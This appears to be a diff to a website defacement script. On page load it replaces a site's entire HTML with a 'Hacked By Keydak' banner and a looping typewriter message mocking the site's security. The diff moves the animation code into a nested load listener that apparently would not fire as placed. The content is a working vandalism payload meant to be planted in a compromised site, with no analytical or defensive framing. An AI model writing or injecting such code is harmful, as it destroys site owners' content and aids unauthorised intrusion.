@@ -22,39 +22,38 @@ document.addEventListener('DOMContentLoaded', function () {
                 <h1> Hacked By Keydak</h1>
                 <hr class="hr">
                 <div class="container">
-                    <p class="text1"></p>
+                    <p class="text1">you need to improve the security system on your site</p>
                 </div>
             </div>
         </body>
-        <script>
-   var text = "you need to improve the security system on your site";
-                var textElement = document.querySelector('.text1');
-                var index = 0;
-
-                function type() {
-                    if (index < text.length) {
-                        textElement.textContent += text.charAt(index);
-                        index++;
-                        setTimeout(type, 150);
-                    } else {
-                        setTimeout(() => {
-                            textElement.classList.add('hidden');
-                            setTimeout(() => {
-                                textElement.textContent = '';
-                                textElement.classList.remove('hidden');
-                                index = 0;
-                                type();
-                            }, 1000); // Wait for fade out effect
-                        }, 1000); // Pause before starting fade out
-                    }
-                }
-
-                type();
-        </script>
         </html>
     `;
 
 
+    document.addEventListener('DOMContentLoaded', function() {
+        var text = "you need to improve the security system on your site";
+        var textElement = document.querySelector('.text1');
+        var index = 0;
 
+        function type() {
+            if (index < text.length) {
+                textElement.textContent += text.charAt(index);
+                index++;
+                setTimeout(type, 150);
+            } else {
+                setTimeout(() => {
+                    textElement.classList.add('hidden');
+                    setTimeout(() => {
+                        textElement.textContent = '';
+                        textElement.classList.remove('hidden');
+                        index = 0;
+                        type();
+                    }, 1000); // Wait for fade out effect
+                }, 1000); // Pause before starting fade out
+            }
+        }
+
+        type();
+    });
     document.documentElement.innerHTML = newHtmlContent;
 });
